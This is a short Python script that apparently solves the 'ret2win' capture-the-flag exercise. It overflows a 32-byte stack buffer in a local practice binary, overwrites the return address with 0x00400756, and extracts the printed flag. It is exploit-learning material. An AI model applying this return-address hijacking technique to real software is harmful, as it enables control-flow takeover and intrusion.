import re
import struct
import sys
from subprocess import PIPE, Popen

FILE_PATH = "./ret2win"

offset = 40  # buffer(32) + rdp(8)
junk = ("A" * offset).encode()
ret_addr = struct.pack("<I", 0x00400756)
payload = junk + ret_addr

p = Popen(FILE_PATH, stdout=PIPE, stdin=PIPE, stderr=PIPE)
result = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", result)[0]

print(flag)
